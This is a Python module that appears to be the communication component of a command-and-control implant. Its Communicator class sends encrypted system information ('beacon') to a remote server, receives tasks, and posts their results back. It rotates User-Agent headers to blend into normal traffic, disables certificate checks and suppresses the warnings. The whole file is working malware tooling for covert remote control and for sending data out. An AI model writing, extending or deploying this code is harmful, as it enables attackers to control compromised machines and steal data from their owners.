import requests
import base64
from datetime import datetime
import json
import random
from .encryption import create_cipher
from .utils import log

class Communicator:
    def __init__(self, server_url, auth_token, encryption_password, user_agents):
        self.server_url = server_url.rstrip("/")
        self.auth_token = auth_token
        self.cipher = create_cipher(encryption_password)
        self.user_agents = user_agents
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({'Authorization': f'Bearer {auth_token}'})

        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    def _headers(self):
        return {'User-Agent': random.choice(self.user_agents)}

    def encrypt(self, data):
        import json
        if isinstance(data, dict):
            data = json.dumps(data)
        encrypted = self.cipher.encrypt(data.encode())
        return base64.b64encode(encrypted).decode()

    def decrypt(self, encrypted_b64):
        try:
            decoded = base64.b64decode(encrypted_b64.encode())
            decrypted = self.cipher.decrypt(decoded)
            return json.loads(decrypted.decode())
        except:
            return None

    def beacon(self, sys_info):
        payload = {'data': self.encrypt(sys_info)}
        try:
            resp = self.session.post(
                f"{self.server_url}/api/v1/sync",
                json=payload,
                headers=self._headers(),
                timeout=30
            )
            if resp.status_code == 200 and resp.json().get('status') == 'success':
                return self.decrypt(resp.json().get('data', ''))
        except:
            pass
        return None

    def submit_results(self, task_id, output, session_id):
        data = {
            'session_id': session_id,
            'task_id': task_id,
            'output': output,
            'timestamp': datetime.now().isoformat()
        }
        payload = {'data': self.encrypt(data)}
        try:
            resp = self.session.post(
                f"{self.server_url}/api/v1/results",
                json=payload,
                headers=self._headers(),
                timeout=30
            )
            return resp.status_code == 200
        except:
            return False